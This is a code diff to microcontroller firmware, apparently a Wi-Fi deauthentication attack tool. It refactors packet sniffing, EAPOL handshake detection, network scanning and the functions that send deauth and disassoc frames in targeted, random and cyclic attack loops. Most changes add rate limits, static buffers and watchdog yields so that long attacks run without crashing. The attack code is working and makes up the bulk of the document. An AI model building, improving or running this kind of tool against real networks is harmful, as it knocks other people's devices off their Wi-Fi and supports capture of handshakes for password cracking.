@@ -190,36 +190,39 @@ void sendResponse(const String& response) {
         return;
     }
     
-    // Create a mutable copy of the response and ensure it ends with '\n'
-    String msg = response;
-    if (!msg.endsWith("\n")) {
-        msg += "\n";
-    }
-    
-    // Determine if the message should be sent
-    bool shouldSend = msg.startsWith("[INFO]") || msg.startsWith("[ERROR]") || (DEBUG_MODE && msg.startsWith("[DEBUG]"));
+    // Determine if the message should be sent without creating copies
+    bool shouldSend = response.startsWith("[INFO]") || response.startsWith("[ERROR]") || 
+                      (DEBUG_MODE && response.startsWith("[DEBUG]")) || 
+                      response.startsWith("[CMD]") || response.startsWith("[MGMT]") || 
+                      response.startsWith("[DATA]") || response.startsWith("[HOP]") ||
+                      !response.startsWith("[");
     if (!shouldSend) {
         return;
     }
 
-    // Log the response to USB serial for debugging if enabled
-    if (DEBUG_MODE) {
-        Serial.print("[DEBUG] Full Response: ");
-        Serial.print(msg);
-    }
-
-    // Send complete message over USB Serial using print (since msg already contains a newline)
-    Serial.print(msg);
-
-    // Preserve existing UART logic with rate limiting
+    // Rate limit to prevent overwhelming the system
+    static unsigned long lastSend = 0;
     unsigned long currentTime = millis();
-    if (currentTime - lastUARTSend < UART_MIN_INTERVAL) {
-        delay(UART_MIN_INTERVAL - (currentTime - lastUARTSend));
+    if (currentTime - lastSend < 25) { // Minimum 25ms between sends
+        return;
     }
-    // Send complete message over UART Serial using print
-    Serial1.print(msg);
-    Serial1.flush();
-    lastUARTSend = millis();
+    lastSend = currentTime;
+
+    // Send message directly to reduce memory usage
+    Serial.print(response);
+    if (!response.endsWith("\n")) {
+        Serial.print("\n");
+    }
+
+    // UART with additional rate limiting
+    if (currentTime - lastUARTSend >= UART_MIN_INTERVAL) {
+        Serial1.print(response);
+        if (!response.endsWith("\n")) {
+            Serial1.print("\n");
+        }
+        Serial1.flush();
+        lastUARTSend = currentTime;
+    }
 }
 
 // =========================
@@ -232,6 +235,16 @@ void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/)
   if (!buf || len < sizeof(wifi_ieee80211_mac_hdr)) {
     return;
   }
+
+  // Use static buffer to prevent stack overflow
+  static char output[256];
+  static unsigned long lastCallback = 0;
+  
+  // Rate limit to prevent overwhelming the system
+  if (millis() - lastCallback < 50) {
+    return;
+  }
+  lastCallback = millis();
 
   // Interpret the header
   wifi_ieee80211_mac_hdr *hdr = (wifi_ieee80211_mac_hdr *)buf;
@@ -248,118 +261,57 @@ void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/)
     if (currentMode == SNIFF_PWNAGOTCHI && !(ftype == 0 && fsubtype == 8 && isPwnagotchiMac(hdr->addr2))) return;
   }
 
-  String output = "[INFO] "; // Initialize an output string to store the results with [INFO] prefix
-
-  // ============ Management ============
+  // Build output efficiently using snprintf
   if (ftype == 0) {
     // Beacon
     if (fsubtype == 8) {
-      output += "[MGMT] Beacon detected ";
-      // Source MAC => hdr->addr2
-      output += "Source MAC: ";
-      char macBuf[18];
-      snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
+      snprintf(output, sizeof(output), "[INFO] [MGMT] Beacon %02X:%02X:%02X:%02X:%02X:%02X",
                hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
                hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
-      output += macBuf;
-
-      // Try to retrieve the ESSID
-      const uint8_t *framePtr = (const uint8_t *)buf;
-      String ssid = extractSSID(framePtr, len);
-      if (ssid.length() > 0) {
-        output += " SSID: " + ssid;
-        // Check if it's a pwnagotchi (MAC DE:AD:BE:EF:DE:AD)
-        if (isPwnagotchiMac(hdr->addr2)) {
-          output += " Pwnagotchi Beacon!";
-        }
+      
+      if (isPwnagotchiMac(hdr->addr2)) {
+        strncat(output, " Pwnagotchi!", sizeof(output) - strlen(output) - 1);
       }
     }
     // Deauth or Disassoc
     else if (fsubtype == 12 || fsubtype == 10) {
-      // Note: 12 => Deauth, 10 => Disassoc
-      bool isDeauth = (fsubtype == 12);
-      output += (isDeauth ? "[MGMT] Deauth detected " : "[MGMT] Disassoc detected ");
-
-      // Sender MAC => hdr->addr2, Receiver MAC => hdr->addr1
-      char senderMac[18], receiverMac[18];
-      snprintf(senderMac, sizeof(senderMac), "%02X:%02X:%02X:%02X:%02X:%02X",
-               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
-               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
-      snprintf(receiverMac, sizeof(receiverMac), "%02X:%02X:%02X:%02X:%02X:%02X",
-               hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
-               hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
-      output += "Sender MAC: " + String(senderMac) + " Receiver MAC: " + String(receiverMac);
-
-      // Reason code if available
-      if (len >= 26) { // 24-byte header + 2 bytes reason
-        uint16_t reasonCode = (uint16_t)buf[24] | ((uint16_t)buf[25] << 8);
-        output += " Reason code: " + String(reasonCode);
-      }
+      const char* frameType = (fsubtype == 12) ? "Deauth" : "Disassoc";
+      snprintf(output, sizeof(output), "[INFO] [MGMT] %s %02X:%02X:%02X:%02X:%02X:%02X->%02X:%02X:%02X:%02X:%02X:%02X",
+               frameType,
+               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5],
+               hdr->addr1[0], hdr->addr1[1], hdr->addr1[2], hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
     }
-    // Probe Request
-    else if (fsubtype == 4) {
-      output += "[MGMT] Probe Request ";
-      // Displays the source
-      char sourceMac[18];
-      snprintf(sourceMac, sizeof(sourceMac), "%02X:%02X:%02X:%02X:%02X:%02X",
+    // Probe Request/Response
+    else if (fsubtype == 4 || fsubtype == 5) {
+      const char* frameType = (fsubtype == 4) ? "ProbeReq" : "ProbeResp";
+      snprintf(output, sizeof(output), "[INFO] [MGMT] %s %02X:%02X:%02X:%02X:%02X:%02X",
+               frameType,
                hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
                hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
-      output += "Source MAC: " + String(sourceMac);
-
-      // Try to retrieve the requested ESSID (often, it's an empty SSID for scanning)
-      const uint8_t *framePtr = (const uint8_t *)buf;
-      String ssid = extractSSID(framePtr, len);
-      if (ssid.length() > 0) {
-        output += " Probe SSID: " + ssid;
-      }
-    }
-    // Probe Response
-    else if (fsubtype == 5) {
-      output += "[MGMT] Probe Response ";
-      // Displays the source
-      char sourceMac[18];
-      snprintf(sourceMac, sizeof(sourceMac), "%02X:%02X:%02X:%02X:%02X:%02X",
-               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
-               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
-      output += "Source MAC: " + String(sourceMac);
-
-      // Try to retrieve the ESSID
-      const uint8_t *framePtr = (const uint8_t *)buf;
-      String ssid = extractSSID(framePtr, len);
-      if (ssid.length() > 0) {
-        output += " SSID: " + ssid;
-      }
     }
     else {
-      output += "[MGMT] Other subtype = " + String(fsubtype);
+      snprintf(output, sizeof(output), "[INFO] [MGMT] Other=%d", fsubtype);
     }
   }
-  // ============ Control ============
   else if (ftype == 1) {
-    output += "[CTRL] Subtype = " + String(fsubtype);
+    snprintf(output, sizeof(output), "[INFO] [CTRL] Subtype=%d", fsubtype);
   }
-  // ============ Data ============
   else if (ftype == 2) {
-    // Try EAPOL detection
     if (isEAPOL(buf, len)) {
-      output += "[DATA] EAPOL detected! ";
-      // Display source and destination MAC
-      char sourceMac[18], destMac[18];
-      snprintf(sourceMac, sizeof(sourceMac), "%02X:%02X:%02X:%02X:%02X:%02X",
-               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
-               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
-      snprintf(destMac, sizeof(destMac), "%02X:%02X:%02X:%02X:%02X:%02X",
-               hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
-               hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
-      output += "Source MAC: " + String(sourceMac) + " Destination MAC: " + String(destMac);
+      snprintf(output, sizeof(output), "[INFO] [DATA] EAPOL %02X:%02X:%02X:%02X:%02X:%02X->%02X:%02X:%02X:%02X:%02X:%02X",
+               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5],
+               hdr->addr1[0], hdr->addr1[1], hdr->addr1[2], hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
     }
     else {
-      output += "[DATA] Other data subtype = " + String(fsubtype);
+      snprintf(output, sizeof(output), "[INFO] [DATA] Subtype=%d", fsubtype);
     }
   }
+  else {
+    return; // Unknown frame type, skip
+  }
 
-  // Send the output
-  sendResponse(output);
+  // Send the output using String constructor to avoid memory leaks
+  sendResponse(String(output));
 }
 
 // =========================
@@ -584,37 +536,37 @@ void wifi_tx_raw_frame(void* frame, size_t length) {
 // Deauth & Disassoc
 //==========================================================
 void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
-  DeauthFrame frame;
-  int channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165};
-  int num_channels = sizeof(channels) / sizeof(channels[0]);
-  for (int i = 0; i < num_channels; ++i) {
-    int channel = channels[i];
-    // Vary the frame content slightly for each channel
-    frame.channel = channel;
-    memcpy(&frame.source, src_mac, 6);
-    memcpy(&frame.access_point, src_mac, 6);
-    memcpy(&frame.destination, dst_mac, 6);
-    frame.reason = reason;
-    wifi_set_channel(channel);
-    wifi_tx_raw_frame((void*)&frame, sizeof(DeauthFrame));
-  }
+  // Use static allocation to reduce stack usage
+  static DeauthFrame frame;
+  
+  // Build the frame once
+  memcpy(&frame.source, src_mac, 6);
+  memcpy(&frame.access_point, src_mac, 6);
+  memcpy(&frame.destination, dst_mac, 6);
+  frame.reason = reason;
+  
+  // Send frame - channel should already be set by caller
+  wifi_tx_raw_frame((void*)&frame, sizeof(DeauthFrame));
+  
+  // Add a small delay to prevent overwhelming the system
+  delay(1);
 }
 
 void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
-  DisassocFrame frame;
-  int channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165};
-  int num_channels = sizeof(channels) / sizeof(channels[0]);
-  for (int i = 0; i < num_channels; ++i) {
-    int channel = channels[i];
-    // Vary the frame content slightly for each channel
-    frame.channel = channel;
-    memcpy(&frame.source, src_mac, 6);
-    memcpy(&frame.access_point, src_mac, 6);
-    memcpy(&frame.destination, dst_mac, 6);
-    frame.reason = reason;
-    wifi_set_channel(channel);
-    wifi_tx_raw_frame((void*)&frame, sizeof(DisassocFrame));
-  }
+  // Use static allocation to reduce stack usage
+  static DisassocFrame frame;
+  
+  // Build the frame once
+  memcpy(&frame.source, src_mac, 6);
+  memcpy(&frame.access_point, src_mac, 6);
+  memcpy(&frame.destination, dst_mac, 6);
+  frame.reason = reason;
+  
+  // Send frame - channel should already be set by caller
+  wifi_tx_raw_frame((void*)&frame, sizeof(DisassocFrame));
+  
+  // Add a small delay to prevent overwhelming the system
+  delay(1);
 }
 
 //==========================================================
@@ -668,6 +620,14 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
 
     // Keep only APs >= start_channel if you want to filter 5GHz
     if ((int)record->channel >= start_channel) {
+      // Limit scan results to prevent memory overflow
+      if (scan_results.size() >= 30) {
+        if (DEBUG_MODE) {
+          sendResponse("[DEBUG] Scan results limit reached, skipping additional APs");
+        }
+        return RTW_SUCCESS;
+      }
+      
       WiFiScanResult result;
       result.ssid = String((const char*) record->SSID.val);
       result.channel = record->channel;
@@ -724,26 +684,34 @@ void printScanResults() {
   }
 
   sendResponse("Detected networks:");
-  String tableHeader = "[INFO] Index\tSSID\t\tBSSID\t\tChannel\tRSSI (dBm)\tFrequency\n";
-  sendResponse(tableHeader);
+  sendResponse("[INFO] Index\tSSID\t\tBSSID\t\tChannel\tRSSI (dBm)\tFrequency");
   
-  // Revert batch size to 2
-  const int batchSize = 2;
-  for (size_t i = 0; i < scan_results.size(); i += batchSize) {
-    String batchData = "";
-    for (size_t j = i; j < i + batchSize && j < scan_results.size(); j++) {
-      String freq = (scan_results[j].channel >= 36) ? "5GHz" : "2.4GHz";
-      batchData += "[INFO] " + String(j) + "\t" + scan_results[j].ssid + "\t" + 
-                  scan_results[j].bssid_str + "\t" +
-                  String(scan_results[j].channel) + "\t" + 
-                  String(scan_results[j].rssi) + "\t" + freq + "\n";
+  // Use static buffer to prevent memory issues
+  static char resultLine[128];
+  
+  // Print results one by one to avoid large string building
+  for (size_t i = 0; i < scan_results.size(); i++) {
+    const char* freq = (scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz";
+    
+    snprintf(resultLine, sizeof(resultLine), "[INFO] %d\t%s\t%s\t%d\t%d\t%s",
+             (int)i, 
+             scan_results[i].ssid.c_str(), 
+             scan_results[i].bssid_str.c_str(),
+             scan_results[i].channel, 
+             scan_results[i].rssi, 
+             freq);
+    
+    sendResponse(String(resultLine));
+    
+    // Add delay to prevent overwhelming UART and allow processing
+    delay(100);
+    
+    // Feed watchdog every few iterations
+    if (i % 5 == 0) {
+      yield();
     }
-    sendResponse(batchData);
-    delay(300); // Small delay between batches
   }
   
-  // Ensure all data is printed before indicating completion
-  delay(1000); // Additional delay to ensure all data is sent
   sendResponse("[INFO] Scan results printed.");
 }
 
@@ -803,6 +771,12 @@ void handleCommand(String command) {
     sendResponse("[INFO] All attacks stopped.");
   }
   else if (command.equalsIgnoreCase("scan")) {
+    // Temporarily disable attacks during scanning
+    bool prev_attack_enabled = attack_enabled;
+    bool prev_disassoc_enabled = disassoc_enabled;
+    attack_enabled = false;
+    disassoc_enabled = false;
+    
     scan_enabled = true;
     sendResponse("[INFO] Starting scan...");
     if (scanNetworks() == 0) {
@@ -813,6 +787,10 @@ void handleCommand(String command) {
     else {
       sendResponse("[ERROR] Scan failed.");
     }
+    
+    // Restore previous attack states
+    attack_enabled = prev_attack_enabled;
+    disassoc_enabled = prev_disassoc_enabled;
   }
   else if (command.equalsIgnoreCase("results")) {
     if (!scan_results.empty()) {
@@ -867,6 +845,11 @@ void handleCommand(String command) {
         }
         sendResponse("[RANDOM ATTACK] Deauth " + String(j + 1) + " => " + scan_results[idx].ssid +
                      " on channel " + String(randChannel));
+        
+        // Add small delay between frames to prevent stack overflow
+        delay(10);
+        // Feed watchdog to prevent resets during long attacks
+        yield();
       }
     }
     else {
@@ -1210,7 +1193,15 @@ void targetAttack() {
         sendResponse("[INFO] Deauth " + String(j + 1) + " => " + target_aps[i].ssid +
                      " (" + target_aps[i].bssid_str + ") on channel " +
                      String(target_aps[i].channel));
+        
+        // Add small delay between frames to prevent stack overflow
+        delay(10);
+        // Feed watchdog to prevent resets during long attacks
+        yield();
       }
+      
+      // Add delay between APs to prevent overwhelming the system
+      delay(25);
     }
     sendResponse("[INFO] Targeted attack completed.");
   }
@@ -1227,8 +1218,14 @@ void generalAttack() {
 void attackCycle() {
   sendResponse("[INFO] Starting attack cycle...");
 
+  // Limit number of APs to attack to prevent stack overflow
+  size_t maxAPs = min((size_t)20, scan_results.size());
+  if (scan_results.size() > 20) {
+    sendResponse("[INFO] Limiting attack to first 20 APs to prevent system overload");
+  }
+
   uint8_t currentChannel = 0xFF;
-  for (size_t i = 0; i < scan_results.size(); i++) {
+  for (size_t i = 0; i < maxAPs; i++) {
     uint8_t targetChannel = scan_results[i].channel;
     if (targetChannel != currentChannel) {
       wifi_set_channel(targetChannel);
@@ -1245,7 +1242,15 @@ void attackCycle() {
       sendResponse("[INFO] Deauth " + String(j + 1) + " => " + scan_results[i].ssid +
                    " (" + scan_results[i].bssid_str + ") on channel " +
                    String(scan_results[i].channel));
+      
+      // Add small delay between frames to prevent stack overflow
+      delay(10);
+      // Feed watchdog to prevent resets during long attacks
+      yield();
     }
+    
+    // Add delay between APs to prevent overwhelming the system
+    delay(25);
   }
   sendResponse("[INFO] Attack cycle completed.");
 }
@@ -1257,6 +1262,14 @@ void setup() {
   Serial.begin(115200);
   // Initialize UART
   Serial1.begin(115200);
+
+  // Add safety limits to prevent stack overflow
+  if (num_send_frames > 10) {
+    num_send_frames = 10; // Limit frames to prevent stack overflow
+  }
+  if (cycle_delay < 1000) {
+    cycle_delay = 1000; // Minimum delay to prevent overwhelming system
+  }
 
   sendResponse("[INFO] USB Serial Test: Setup initialized.");
   sendResponse("[INFO] UART Serial Test: Setup initialized.");
@@ -1390,7 +1403,15 @@ void loop() {
         sendResponse("[INFO] Disassoc frame " + String(j + 1) + " => " + aps_to_attack[i].ssid +
                      " (" + aps_to_attack[i].bssid_str + ") on channel " +
                      String(aps_to_attack[i].channel));
+        
+        // Add small delay between frames to prevent stack overflow
+        delay(10);
+        // Feed watchdog to prevent resets during long attacks
+        yield();
       }
+      
+      // Add delay between APs to prevent overwhelming the system
+      delay(25);
     }
 
     sendResponse("[INFO] Disassociation Attack cycle completed.");
